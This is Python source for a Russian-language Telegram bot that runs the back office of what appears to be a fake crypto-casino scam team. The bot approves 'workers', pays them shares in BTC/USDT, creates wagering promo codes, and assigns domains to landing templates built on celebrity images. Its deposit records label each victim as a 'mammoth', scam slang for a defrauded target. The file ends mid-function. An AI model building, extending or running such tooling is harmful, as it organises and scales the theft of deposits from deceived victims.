from datetime import datetime
import time
from config import *
import utils
from db import DB, cursor, conn
import api
import handlers.cmd_handler as cmd_handler
from log import create_logger

logger = create_logger(__name__)
import main
import json
from aiogram.types import MessageEntity

templates = [
  "default_new.webp",
  "2_lionel_messi.jpg",
  "3_elon_musk.jpg",
  "4_conor_mcgregor.jpg",
  "5_cristiano_ronaldo.jpg",
  "6_lionel_messi_2.jpg",
  "7_gates_of_olympus.jpg",
  "8_star_xu.jpg",
  "9_the_dog_house.jpg",
  "10_changpeng_zhao.jpg",
  "11_sky_bounty.jpg",
  "12_ben_zhou.jpg",
  "13_sweet_bonanza.jpg",
  "15_zeus_vs_hades.jpg",
  "16_chicken_cross.jpg",
  "17_sugar_rush.jpg",
  "18_aviamasters.jpg",
  "19_girl.jpg",
  "20_drake.jpg",
  "21_girl_2.jpg",
  "1_default.jpg",
  "green/default.jpg",
  "green/standard_2.jpg",
  "green/ronaldo.jpg",
  "green/ronaldo_2.jpg",
  "green/trump.jpg",
  "green/elon_musk.jpg",
  "green/mbappe.jpg",
  "green/angelina_jolie.jpg",
  "green/keanu_reeves.jpg",
  "green/50_cent.jpg",
  "green/kylie_jenner.jpg",
  "green/selena_gomez.jpg",
  "green/hades.jpg",
  "green/olympus.jpg",
  "green/plinko.jpg",
  "green/coinflip.jpg",
  "green/dice.jpg",
  "green/sugar_rush.jpg",
  "green/sweet_bonanza.jpg",
  "green/the_dog_house.jpg",
  "green/playboy.jpg",
  "green/girl.jpg",
  "green/girl2.jpg",
  "green/girl3.jpg",
  "green/girl4.jpg",
  "green/girl5.jpg",
  "green/brazzers.jpg"
]

def get_template_keyboard(current_idx, domain_name):
    btns = []
    if current_idx > 0:
        btns.append(types.InlineKeyboardButton(
            text="⬅️ Назад",
            callback_data=f"Template_prev?{domain_name}|{current_idx - 1}"
        ))
    btns.append(types.InlineKeyboardButton(
        text="✅ Выбрать",
        callback_data=f"Set_domain_template?{domain_name}|{templates[current_idx]}"
    ))
    if current_idx < len(templates) - 1:
        btns.append(types.InlineKeyboardButton(
            text="➡️ Вперед",
            callback_data=f"Template_next?{domain_name}|{current_idx + 1}"
        ))
    return types.InlineKeyboardMarkup(inline_keyboard=[btns])

@dp.callback_query(F.data == F.data)
async def inline_handler(call: types.CallbackQuery, state: FSMContext):
    """
    Единый handler inline кнопок
    """
    logger.info(f"Received inline callback \"{str(call.data)}\" from @{call.from_user.username}")

    DB.update(user_id=call.from_user.id, column="tg_firstname", new_data=call.from_user.first_name,
              table=DB.users_table)
    DB.update(user_id=call.from_user.id, column="tg_username", new_data=call.from_user.username, table=DB.users_table)
    _is_banned = DB.get(user_id=call.from_user.id, data="_is_banned", table=DB.users_table)
    if str(call.from_user.id) in ADMIN_IDS or _is_banned == "False":
        if "user_request_" in str(call.data):
            admin_solution = str(call.data).split("_")[2].split("?")[0]
            target_user_id = str(call.data).split("?")[1]
            target_username = DB.get(user_id=target_user_id, data='tg_username', table=DB.unconfirmed_users_table)
            user = DB.get(user_id=target_user_id, data="user_id", table=DB.users_table)
            print(user)
            if not user:
                if admin_solution == 'accept':
                    DB.update(user_id=target_user_id, column="state", new_data="confirmed",
                              table=DB.unconfirmed_users_table)
                    DB.insert(user_id=target_user_id, tg_username=target_username, tg_firstname="None")
                    await call.message.edit_reply_markup(reply_markup=types.InlineKeyboardMarkup(
                        inline_keyboard=[[types.InlineKeyboardButton(text="✅ Принята!", callback_data="pass")]]))
                    msg = await bot.send_message(
                        text="✅ Заявка была принята, успешной работы! Если у вас не отобразилось меню бота пропишите /start",
                        chat_id=target_user_id,
                    )
                    await cmd_handler.start(msg=msg, state=state, user_id=target_user_id)

                elif admin_solution == "decline":
                    DB.update(user_id=target_user_id, column="state", new_data="unconfirmed",
                              table=DB.unconfirmed_users_table)
                    await call.message.edit_reply_markup(reply_markup=types.InlineKeyboardMarkup(
                        inline_keyboard=[[types.InlineKeyboardButton(text="❌ Отклонена!", callback_data="pass")]]))
                    await bot.send_message(
                        text=f"❌ Заявка была отклонена, для уточнения причины свяжитесь с администрацией - {config['admin_username']}",
                        chat_id=target_user_id
                    )
            else:
                btns = [[
                    types.InlineKeyboardButton(text="Заявка уже рассмотрена", callback_data="pass")
                ]]
                await call.message.edit_reply_markup(
                    reply_markup=types.InlineKeyboardMarkup(inline_keyboard=btns)
                )



        elif call.data == "change_username":
            await call.message.edit_text(
                text="⭐️ Введите новый ник, который будет отображаться в отстуке:",
                reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[]])
            )
            await state.set_state(States.change_username)

        elif call.data == "link_wallet":
            link_wallet_btns = types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="BTC", callback_data="link_wallet_BTC"),
                 types.InlineKeyboardButton(text="USDT", callback_data="link_wallet_USDT")],
                [types.InlineKeyboardButton(text="< Назад", callback_data="user_profile")]
            ])
            await call.message.edit_text(
                text="💳 Выберите какой кошелек вы хотите привязать/изменить",
                reply_markup=link_wallet_btns
            )

        elif "link_wallet_" in str(call.data):
            wallet_name = str(call.data).split("_")[2]
            await call.message.edit_text(
                text=f"💳 Введите новый адрес вашего {wallet_name} кошелька"
            )
            await state.set_state(States.link_wallet)
            await state.update_data(wallet_name=wallet_name)

        elif call.data == "payout":
            payout_btns = types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="BTC", callback_data="payout_BTC"),
                 types.InlineKeyboardButton(text="USDT", callback_data="payout_USDT")],
                [types.InlineKeyboardButton(text="< Назад", callback_data="user_profile")]
            ])
            await call.message.edit_text(
                text="💸 На какой кошелек вы хотите заказать выплату?",
                reply_markup=payout_btns
            )

        elif str(call.data).startswith("all_payout_"):
            await state.clear()
            balance = DB.get(user_id=call.from_user.id, data="balance", table=DB.users_table)
            await utils.update_user_balance(
                user_id=call.from_user.id,
                amount_of_payout=balance,
                msg2edit=call.message,
                wallet_name=str(call.data).split("_")[2]
            )

        elif str(call.data).startswith("payout_request_accept?"):
            user_id = str(call.data).split("?")[1]
            await call.message.edit_reply_markup(
                reply_markup=types.InlineKeyboardMarkup(
                    inline_keyboard=[[types.InlineKeyboardButton(text="✅ Выплачена!", callback_data="pass")]])
            )
            await bot.send_message(
                chat_id=user_id,
                text="✅ Выплата совершена, проверьте кошелек"
            )

        elif str(call.data).startswith("payout_request_decline?"):
            user_id = str(call.data).split("?")[1]
            await call.message.edit_reply_markup(
                reply_markup=types.InlineKeyboardMarkup(
                    inline_keyboard=[[types.InlineKeyboardButton(text="❌ Отклонена!", callback_data="pass")]])
            )
            await bot.send_message(
                chat_id=user_id,
                text="❌ Выплата отклонена, деньги вернулись на баланс"
            )
            msg_text_list = str(call.message.text).splitlines()
            amount_of_payout = msg_text_list[2].split(":")[1].replace("$", "").replace(" ", "")
            user_id = msg_text_list[1].split("/")[1].replace(" ", "")
            balance = DB.get(user_id=user_id, data="balance", table=DB.users_table)
            DB.update(user_id=user_id, column="balance", new_data=float(balance) + float(amount_of_payout),
                      table=DB.users_table)


        elif str(call.data).startswith("payout_"):
            wallet_data = DB.get(user_id=call.from_user.id, data=f"{str(call.data).lower().split('_')[1]}_wallet",
                                 table=DB.users_table)
            if wallet_data is None:
                await call.message.edit_text(
                    text=f"❌ Укажите {str(call.data).split('_')[1]} кошелек для выплаты"
                )
                return

            text = f'''
💸 Введите сумму выплаты

⚡️ ️Доступно: {DB.get(user_id=call.from_user.id, data='balance', table=DB.users_table)} $
                '''
            payout_btns = types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="Отменить заявку", callback_data="cancel_payout"),
                 types.InlineKeyboardButton(text="Вывести все",
                                            callback_data=f"all_payout_{str(call.data).split('_')[1]}")]
            ])

            await call.message.edit_text(
                text=text,
                reply_markup=payout_btns
            )
            await state.set_state(States.payout_amount)
            await state.update_data(msg2edit=call.message)
            await state.update_data(wallet=str(call.data).split("_")[1])

        elif call.data == "cancel_payout":
            await main.start(msg=call.message, state=state, user_id=call.from_user.id)











        #




        #



















        elif str(call.data).startswith("promo_ubt_"):
            promo_ubt_state = str(call.data).split("_")[2].split("?")[0]
            creator_user_id = str(call.data).split("?")[1].split("_")[0]
            name = str(str(call.data).split("?")[1].split("_")[1]).lower()
            amount = str(call.data).split("?")[1].split("_")[2]
            DB.insert_promo(user_id=creator_user_id, name=name, ubt=promo_ubt_state, amount=amount)
            api_result = await api.create_promo(
                data={
                    'name': name,
                    'amount': amount,
                    'shouldWager': True if promo_ubt_state == "enable" else False,
                }
            )
            print(api_result)
            if api_result["success"] is True:
                await call.message.edit_text(
                    text="✅️ Промокод успешно создан!",
                    reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[]])
                )

        elif call.data == "create_promo":
            await call.message.edit_text(
                text="💵 Введите сумму промокода в $",
                reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[]])
            )
            await state.set_state(States.create_promo_amount)

        elif call.data == "stats_promo":
            count_of_promocodes = DB.get_all_user_id(
                user_id=call.from_user.id,
                data="name",
                table=DB.promocodes
            )
            if len(count_of_promocodes) == 0:
                await call.answer(
                    text="❌ У вас нет промокодов",
                    show_alert=True
                )
            else:
                btns = await utils.create_promo_btns(user_id=call.from_user.id, btns_type="stats")
                text = '''
👀 Выберите промокод для статистики
                    '''
                await call.message.edit_text(
                    text=text,
                    reply_markup=btns
                )

        elif call.data == "delete_promo":
            count_of_promocodes = DB.get_all_user_id(
                user_id=call.from_user.id,
                data="name",
                table=DB.promocodes
            )
            if len(count_of_promocodes) == 0:
                await call.answer(
                    text="❌ У вас нет промокодов",
                    show_alert=True
                )
            else:
                btns = await utils.create_promo_btns(user_id=call.from_user.id, btns_type="delete")
                text = '👀 Выберите, какой промокод хотите удалить'
                await call.message.edit_text(
                    text=text,
                    reply_markup=btns
                )

        elif call.data == "edit_promo":
            count_of_promocodes = DB.get_all_user_id(
                user_id=call.from_user.id,
                data="name",
                table=DB.promocodes
            )
            if len(count_of_promocodes) == 0:
                await call.answer(
                    text="❌ У вас нет промокодов",
                    show_alert=True
                )
            else:
                btns = await utils.create_promo_btns(user_id=call.from_user.id, btns_type="edit")
                text = '👀 Выберите промокод для редактирования'
                await call.message.edit_text(
                    text=text,
                    reply_markup=btns
                )

        elif str(call.data).startswith("promocode_"):
            promo_name = str(call.data).split("_")[1].split("?")[0]
            btn_type = str(call.data).split("?")[1]
            if btn_type == "stats":
                promo_view_text = await utils.promo_view_stats(promo_name)
                await call.message.edit_text(
                    text=promo_view_text,
                    reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[]]),
                    parse_mode="HTML"
                )
            elif btn_type == "delete":
                text = f'⁉️ Вы уверены, что хотите удалить промокод {promo_name}?'
                btns = types.InlineKeyboardMarkup(inline_keyboard=[
                    [types.InlineKeyboardButton(text="❌ Отменить",
                                                callback_data=f"promocodeDelete_decline?{promo_name}"),
                     types.InlineKeyboardButton(text="✅ Удалить", callback_data=f"promocodeDelete_accept?{promo_name}")]
                ])
                await call.message.edit_text(
                    text=text,
                    reply_markup=btns
                )
            elif btn_type == "edit":
                btns = types.InlineKeyboardMarkup(inline_keyboard=[
                    [types.InlineKeyboardButton(text="Сумма", callback_data=f"promocodeEdit_amount?{promo_name}"),
                     types.InlineKeyboardButton(text="Отыгрыш", callback_data=f"promocodeEdit_ubt?{promo_name}")]
                ])
                cursor.execute(f"SELECT amount, ubt FROM promocodes WHERE name = ?", (promo_name,))
                result = cursor.fetchall()[0]
                promo_amount = result[0]
                promo_ubt = result[1]
                text = f'''
✍️ Редактировать промокод
👀 Промокод: {promo_name}
💵 Сумма промокода: {promo_amount}
🎰 Отыгрыш промокода: {"включен" if promo_ubt == "enable" else "выключен"}
                '''
                await call.message.edit_text(
                    text=text,
                    reply_markup=btns
                )

        elif str(call.data).startswith("promocodeEdit_"):
            edit_type = str(call.data).split("_")[1].split("?")[0]
            promo_name = str(call.data).split("?")[1]
            if edit_type == "amount":
                text = f"💵 Введите новую сумму промокода {promo_name}:"
                await call.message.edit_text(
                    text=text,
                    reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[]])
                )
                await state.set_state(States.edit_promo_amount)
                await state.update_data(promo_name=promo_name)
            elif edit_type == "ubt":
                cursor.execute('SELECT ubt FROM promocodes WHERE name = ?', (promo_name,))
                promo_ubt = cursor.fetchone()[0]
                text = f"🎰 Отыгрыш промокода {promo_name}: {'включен' if promo_ubt == 'enable' else 'отключен'}"
                promo_edit_btns = types.InlineKeyboardMarkup(inline_keyboard=[
                    [types.InlineKeyboardButton(text="✅ Отключен",
                                                callback_data=f"promocodeEdit?ubt_disable_{promo_name}"),
                     types.InlineKeyboardButton(text="❌ Включен",
                                                callback_data=f"promocodeEdit?ubt_enable_{promo_name}")]
                ])
                await call.message.edit_text(
                    text=text,
                    reply_markup=promo_edit_btns
                )

        elif str(call.data).startswith("promocodeEdit?ubt_"):
            edit_state = str(call.data).split("_")[1]
            promo_name = str(call.data).split("_")[2]
            promo = await api.get_promo(promo_name)
            promo_amount = promo["data"]["amount"]

            try:
                cursor.execute("UPDATE promocodes SET ubt = ? WHERE name = ?", (edit_state, promo_name))
                conn.commit()
                api_result = await api.edit_promo({
                    'name': promo_name,
                    'amount': promo_amount,
                    'shouldWager': True if edit_state == "enable" else False
                })
                if api_result["success"] is True:
                    await call.message.edit_text(
                        text="✅️ Промокод успешно отредактирован!",
                        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[]])
                    )
                else:
                    raise Exception
            except Exception:
                await call.message.edit_text(
                    text="❌ При редактировании промокода произошла ошибка!",
                    reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[]])
                )

        elif str(call.data).startswith("promocodeDelete_"):
            delete_state = str(call.data).split("_")[1].split("?")[0]
            promo_name = str(call.data).split("?")[1]
            if delete_state == "accept":
                try:
                    cursor.execute(f"DELETE from promocodes where name = ?", (promo_name,))
                    conn.commit()
                    api_result = await api.delete_promo(promo_name)
                    if api_result["success"] is True:
                        await call.message.edit_text(
                            text="✅️ Промокод успешно удален!",
                            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[]])
                        )
                    else:
                        raise Exception
                except Exception:
                    await call.message.edit_text(
                        text="❌ При удалении промокода произошла ошибка!",
                        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[]])
                    )


        elif str(call.data).startswith("promo_page_"):
            page = int(str(call.data).split("_")[2].split("?")[0])
            btns_type = str(call.data).split("?")[1]
            btns = await utils.create_promo_btns(
                user_id=call.from_user.id,
                btns_type=btns_type,
                page=page
            )
            if btns is not False:
                await call.message.edit_reply_markup(
                    reply_markup=btns
                )
            else:
                await call.answer()
                return

        elif str(call.data).startswith("workers_page_"):
            page = int(str(call.data).split("_")[2].split("?")[0])
            workers = DB.get_all(data="user_id", table=DB.users_table)
            btns = await utils.create_workers_btns(data_list=workers, page=page)
            if btns is not False:
                await call.message.edit_reply_markup(
                    reply_markup=btns
                )
            else:
                await call.answer()
                return

        elif str(call.data).startswith("branches_page_"):
            page = int(str(call.data).split("_")[2].split("?")[0])
            branches = DB.get_all(data="name", table=DB.branches_table)
            btns = await utils.create_branches_btns(data_list=branches, page=page)
            if btns is not False:
                await call.message.edit_reply_markup(
                    reply_markup=btns
                )
            else:
                await call.answer()
                return

        elif str(call.data).startswith("worker_"):
            worker_id = str(call.data).split("_")[1].split("?")[0]
            text, worker_btns = await utils.create_worker_profile(worker_id)
            await call.message.edit_text(
                text=text,
                reply_markup=types.InlineKeyboardMarkup(inline_keyboard=worker_btns)
            )

        elif str(call.data).startswith("branch_"):
            branch_name = str(call.data).split("_")[1].split("?")[0]
            cursor.execute("SELECT * FROM branches WHERE name = ?", (branch_name,))
            branch_data = cursor.fetchone()
            if branch_data:
                owner_name = DB.get(user_id=branch_data[1], data="tg_firstname", table=DB.users_table)
                owner_username = DB.get(user_id=branch_data[1], data="tg_username", table=DB.users_table)
                text = f"🏢 Филиал: {branch_data[2]}\n👤 Овнер: {owner_name} (@{owner_username}) / {branch_data[1]}\n📊 Процент: {branch_data[3]}%"
                btns = [[types.InlineKeyboardButton(text="< Назад", callback_data="admin_branches")]]
                await call.message.edit_text(text=text, reply_markup=types.InlineKeyboardMarkup(inline_keyboard=btns))
            else:
                await call.answer("Филиал не найден", show_alert=True)

        elif str(call.data).startswith("select_branch_"):
            branch_name = call.data.split("_", 2)[2]
            cursor.execute("SELECT id FROM branches WHERE name = ?", (branch_name,))
            branch_id = cursor.fetchone()[0]
            DB.update(user_id=call.from_user.id, column="branch_id", new_data=branch_id, table=DB.users_table)
            await call.message.edit_text("✅ Филиал выбран успешно!")

        elif str(call.data).startswith("ban/unban_"):
            worker_id = str(call.data).split("_")[1]
            ban_state = DB.get(user_id=worker_id, data="_is_banned", table=DB.users_table)
            if ban_state:
                ban_state = f'{"True" if ban_state == "False" else "False"}'
                result = DB.update(user_id=worker_id, column="_is_banned", new_data=ban_state, table=DB.users_table)
                if result:
                    await call.answer(
                        "Пользователь успешно " + ("заблокирован" if ban_state == 'True' else "разблокирован"))
                else:
                    print(2)

        elif str(call.data).startswith("changeBalance_"):
            worker_id = str(call.data).split("_")[1]
            worker_name = DB.get(user_id=worker_id, data="tg_firstname", table=DB.users_table)
            worker_username = DB.get(user_id=worker_id, data="tg_username", table=DB.users_table)
            worker_balance = DB.get(user_id=worker_id, data="balance", table=DB.users_table)
            await state.set_state(States.user_input_new_balance)
            await state.update_data(worker_id=worker_id)
            text = f"""
👥 Воркер {worker_id} ({worker_name}/@{worker_username})

Баланс: {worker_balance}
Введите новый баланс:"""
            await call.message.edit_text(
                text=text,
            )

        elif str(call.data).startswith("show_wallets_"):
            worker_id = str(call.data).split("_")[2]
            worker_name = DB.get(user_id=worker_id, data="tg_firstname", table=DB.users_table)
            worker_username = DB.get(user_id=worker_id, data="tg_username", table=DB.users_table)
            worker_btc_wallet = DB.get(user_id=worker_id, data="btc_wallet", table=DB.users_table)
            worker_usdt_wallet = DB.get(user_id=worker_id, data="usdt_wallet", table=DB.users_table)
            text = f'''
👥 Воркер {worker_id} ({worker_name}/@{worker_username}) 
💳 Привязанные кошельки:
└ BTC: {worker_btc_wallet}
└ USDT: {worker_usdt_wallet}
                '''
            btns = types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="< Назад", callback_data=f"worker_{worker_id}")]
            ])
            await call.message.edit_text(
                text=text,
                reply_markup=btns
            )

        elif str(call.data).startswith("show_percentage_"):
            worker_id = str(call.data).split("_")[2]
            worker_name = DB.get(user_id=worker_id, data="tg_firstname", table=DB.users_table)
            worker_username = DB.get(user_id=worker_id, data="tg_username", table=DB.users_table)
            worker_perc = DB.get(user_id=worker_id, data="percentage", table=DB.users_table)
            text = f'''
👥 Воркер {worker_id} ({worker_name}/@{worker_username}) 
🤝 Процент выплат - {worker_perc}%
✍️ Введите новый процент воркера:
                '''
            btns = types.InlineKeyboardMarkup(
                inline_keyboard=[[types.InlineKeyboardButton(text="< Назад", callback_data=f"worker_{worker_id}")]])
            await call.message.edit_text(
                text=text,
                reply_markup=btns
            )
            await state.set_state(States.edit_worker_perc)
            await state.update_data(worker_id=worker_id)
        elif call.data == "admin_info":
            await state.clear()
            await call.message.edit_text(text="Введите текст в кнопке “Информация”:",
                                         reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                                             [types.InlineKeyboardButton(text="< Назад", callback_data="back_admin")]]))
            await state.set_state(States.edit_info)

        elif call.data == "admin_url":
            await state.clear()
            await call.message.edit_text(text="Введите актуальный домен (можно несколько):",
                                         reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                                             [types.InlineKeyboardButton(text="< Назад", callback_data="back_admin")]]))
            await state.set_state(States.edit_url)

        elif call.data == "admin_workers":
            await state.clear()
            workers = DB.get_all(data="user_id", table=DB.users_table)
            workers_btns = await utils.create_workers_btns(workers)
            await call.message.edit_text(
                text="👀 Выберите воркера или напишите /user + тег/айди",
                reply_markup=workers_btns
            )

        elif call.data == "admin_branches":
            await state.clear()
            branches = DB.get_all(data="name", table=DB.branches_table)
            branches_btns = await utils.create_branches_btns(branches)
            if branches_btns:
                await call.message.edit_text(
                    text="🏢 Филиалы\n\n➕ Создать новый филиал",
                    reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                        [types.InlineKeyboardButton(text="➕ Создать филиал", callback_data="create_branch")],
                        *branches_btns.inline_keyboard
                    ])
                )
            else:
                await call.message.edit_text(
                    text="🏢 Филиалы\n\n➕ Создать новый филиал",
                    reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                        [types.InlineKeyboardButton(text="➕ Создать филиал", callback_data="create_branch")],
                        [types.InlineKeyboardButton(text="< Назад", callback_data="back_admin")]
                    ])
                )

        elif call.data == "create_branch":
            await state.clear()
            await call.message.edit_text(
                text="🏢 Введите название филиала:",
                reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[]])
            )
            logger.info("Setting state to create_branch_name")
            await state.set_state(States.create_branch_name)
            await state.update_data(msg2edit=call.message)

        elif call.data == "admin_topWorkers":
            text = utils.create_top_list()
            await call.message.edit_text(
                text=text,
                reply_markup=types.InlineKeyboardMarkup(
                    inline_keyboard=[[types.InlineKeyboardButton(text="< Назад", callback_data="back_admin")]])
            )

        elif call.data == "admin_stats":
            data = await api.get_profile_stats()
            profile_data = data["data"]
            all_time_balance = profile_data["depositsAll"]
            all_users = profile_data["users"]
            all_time_promo_act = profile_data["promoActivations"]
            verif_users = profile_data["verified"]
            multi_deposits = profile_data["multiDeps"]
            conversion = profile_data["conversion"]
            text = f'''
⌛️ Статистика за все время со всех доменов:

💰 Доход: {all_time_balance}$
👥 Пользователей: {all_users}
🎟 Активаций промокодов: {all_time_promo_act}  
🛂 Прошли верификацию: {verif_users}
💳 Повторных депозитов: {multi_deposits}
💸 Конверсия рег./депов: {round(conversion, 3)}$
                '''
            await call.message.edit_text(
                text=text,
                reply_markup=types.InlineKeyboardMarkup(
                    inline_keyboard=[[types.InlineKeyboardButton(text="< Назад", callback_data="back_admin")]])
            )

        elif call.data == "admin_msg":
            text = '''
💬 Введите сообщение для рассылки:
                '''
            btns = [
                [types.InlineKeyboardButton(text="❌ Отменить", callback_data="back_admin")]
            ]
            await call.message.edit_text(
                text=text,
                reply_markup=types.InlineKeyboardMarkup(inline_keyboard=btns)
            )
            await state.set_state(States.admin_ad)


        elif str(call.data).startswith("adminMsg_"):
            msg_state = str(call.data).split("_")[1]
            if msg_state == "accept":
                start_timestamp = time.time()
                await call.message.edit_text(
                    text="✅ Рассылка запущена!",
                    reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[]])
                )
                text = call.message.text
                users = DB.get_all("user_id", DB.users_table)
                tasks = []

                async def send_msg_to_user(user_id):
                    try:
                        await bot.send_message(
                            chat_id=user_id,
                            text=text,
                            entities=call.message.entities
                        )
                        return True
                    except Exception:
                        return False

                tasks.extend([send_msg_to_user(user_id) for user_id in users])
                results = await asyncio.gather(*tasks)
                success = results.count(True)
                errors = results.count(False)
                admin_text = f"""
✅️ Рассылка завершена успешно!
Отправлено: {success}
Не отправлено: {errors}
Затрачено времени: {datetime.fromtimestamp(time.time() - start_timestamp).strftime("%M мин %S сек")}
                """
                await call.message.answer(
                    text=admin_text
                )
            else:
                await call.message.edit_text(
                    text="❌ Рассылка отменена!",
                    reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[]])
                )
                return

        elif call.data == "admin_settings":
            await call.message.edit_text(
                text="⚙️ Настройки",
                reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                    [types.InlineKeyboardButton(text="🤝 Проценты выплат", callback_data="admin_settings_percentage")],
                    [types.InlineKeyboardButton(text="< Назад", callback_data="back_admin")]
                    ])
            )

        elif call.data == "admin_settings_percentage":
            btns = [
                [types.InlineKeyboardButton(text="Изменить у всех", callback_data="admin_change_perc?all")],
                [types.InlineKeyboardButton(text="Изменить у всех, кроме тех, кому меняли вручную",
                                            callback_data="admin_change_perc?manual")],
                [types.InlineKeyboardButton(text="< Назад", callback_data="admin_settings")]
            ]
            await call.message.edit_text(
                text="🤝 Проценты выплат",
                reply_markup=types.InlineKeyboardMarkup(inline_keyboard=btns)
            )

        elif str(call.data).startswith("admin_change_perc?"):
            perc_state = str(call.data).split("?")[1]
            if perc_state == "all":
                text = '''
👥 Изменить у всех

Введите процент выплат, который изменится у всех трафферов (просто число, например 50):
                        '''
                await state.set_state(States.admin_perc_change_all)
                await call.message.edit_text(
                    text=text,
                    reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                        [types.InlineKeyboardButton(text="< Назад", callback_data="admin_settings_percentage")]])
                )
            elif perc_state == "manual":
                text = '''
👥 Изменить у всех, кроме тех, кому меняли вручную

Введите процент выплат, который изменится у всех трафферов, кроме тех, кому меняли вручную (просто число, например 50):
                    '''
                await state.set_state(States.admin_perc_change_manual)
                await call.message.edit_text(
                    text=text,
                    reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                        [types.InlineKeyboardButton(text="< Назад", callback_data="admin_settings_percentage")]])
                )

        elif str(call.data).startswith("top_deposits_"):
            period = str(call.data).split("_")[2]
            text = utils.create_top_deposits(period)
            await call.message.edit_text(
                text=text,
                reply_markup=types.InlineKeyboardMarkup(
                    inline_keyboard=[[types.InlineKeyboardButton(text="< Назад", callback_data="back_main")]])
            )
        elif call.data == "admin_deposits":
            cursor.execute(f"SELECT id, amountUSD FROM {DB.deposits}")
            fetch = cursor.fetchall()
            deposits = []
            ids = []
            for item in fetch:
                deposits.append(item[1])
                ids.append(item[0])
            else:
                if deposits:
                    btns = await utils.create_deposits_btns(data_list=deposits, ids=ids)
                    text = '''
👀 Выберите депозит для просмотра
                        '''
                    await call.message.edit_text(
                        text=text,
                        reply_markup=btns
                    )
                else:
                    await call.message.edit_text(
                        text="❌ Депозиты не найдены",
                        reply_markup=types.InlineKeyboardMarkup(
                            inline_keyboard=[[types.InlineKeyboardButton(text="< Назад", callback_data="back_admin")]])
                    )


        elif str(call.data).startswith("deposits_page_"):
            page = int(str(call.data).split("_")[2].split("?")[0])
            cursor.execute(f"SELECT id, amountUSD FROM {DB.deposits}")
            fetch = cursor.fetchall()
            deposits = []
            ids = []
            for item in fetch:
                deposits.append(item[1])
                ids.append(item[0])
            btns = await utils.create_deposits_btns(data_list=deposits, page=page, ids=ids)
            if btns is not False:
                await call.message.edit_reply_markup(
                    reply_markup=btns
                )
            else:
                await call.answer()
                return

        elif str(call.data).startswith("deposit_"):
            deposit_id = str(call.data).split("?")[1]
            cursor.execute(f"SELECT * FROM {DB.deposits} WHERE id = ?", (deposit_id,))
            deposit_data = cursor.fetchall()[0]
            worker_name = DB.get(user_id=deposit_data[1], data="tg_firstname", table=DB.users_table)
            worker_username = DB.get(user_id=deposit_data[1], data="tg_username", table=DB.users_table)
            text = f'''
👀 Депозит {deposit_data[3]} $
👨‍ Воркер: {worker_name} (@{worker_username}) / {deposit_data[1]} 
🦣 Логин мамонта: {deposit_data[4]}
💎 Монета: {deposit_data[5]}
🔗 Домен: {deposit_data[6]}
🗓 Дата: {deposit_data[7]} 
⛓️ Хеш: {deposit_data[8]}
                '''
            await call.message.edit_text(
                text=text,
                reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[]])
            )

        elif str(call.data).startswith("back_"):
            menu = str(call.data).split("_")[1]
            await state.clear()
            if menu == "main":
                await cmd_handler.start(
                    msg=call.message,
                    state=state,
                    user_id=call.from_user.id,
                    edit_msg=True
                )

            elif menu == "admin":
                await cmd_handler.admin(
                    msg=call.message,
                    state=state,
                    user_id=call.from_user.id,
                    edit_msg=True
                )

        elif call.data == "admin":
            await state.clear()
            await cmd_handler.admin(msg=call.message, state=state, user_id=call.from_user.id)


        elif call.data == "pass":
            await call.answer()
            return


        elif str(call.data).startswith("user_domain_menu?"):
            domain = call.data.split("?")[1]
            keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="🌐 Сменить лендинг", callback_data=f"edit_domain_landing?{domain}")],
                # [types.InlineKeyboardButton(text="📦 Сменить ФБ", callback_data=f"edit_domain_fb?{domain}")],
                # [types.InlineKeyboardButton(text="🌍 Сменить гео-блок", callback_data=f"edit_domain_geo?{domain}")],
                [types.InlineKeyboardButton(text="⬅️ Назад", callback_data="user_my_domains_list?0")]
            ])
            status = cursor.execute(f"SELECT status FROM user_domains WHERE domain_name = ?", (domain,)).fetchone()
            status_emoji = {
                "pending": "⏳",
                "verified": "🟢",
                "active": "🟢",
                "rejected": "❌",
                "checking": "🔄"
            }.get(status[0], "❓")
            status_text = {
                "pending": "Ожидание",
                "verified": "Проверен",
                "active": "Активен",
                "rejected": "Отклонен",
                "checking": "Проверяется"
            }.get(status[0], "Н/Д")
            ns_list = await api.get_domain_ns(domain)
            text = f"""
    🔍 Информация о домене:
    
    🌐 Домен: <b>{domain}</b>
    {status_emoji} Статус: {status_text}
    
    NS серверы:
    🔹 <code>{ns_list[0]}</code>
    🔹 <code>{ns_list[1]}</code>
    
    Выберите действие:
    """
            await call.message.edit_text(
                text,
                reply_markup=keyboard,
                parse_mode="HTML"
            )

        elif str(call.data).startswith("edit_domain_landing?"):
            domain = call.data.split("?")[1]

            photo_path = f"https://gambler-partners.is/templates/{templates[0]}"
            keyboard = get_template_keyboard(0, domain)
            await call.message.answer_photo(
                photo=photo_path,
                caption=f"Выберите шаблон лендинга для домена {domain}",
                reply_markup=keyboard
            )

        elif str(call.data).startswith("Set_domain_template?"):
            data = call.data.split("?")[1]
            domain, template = data.split("|")
            if 'default' not in template:
                result = await api.set_domain_template(domain, '_'.join(template.split('/')[-1].split('.')[0].split('_')[1:]))
            else:
                result = await api.set_domain_template(domain, template.split('/')[-1].split('.')[0].replace('_new', ''))

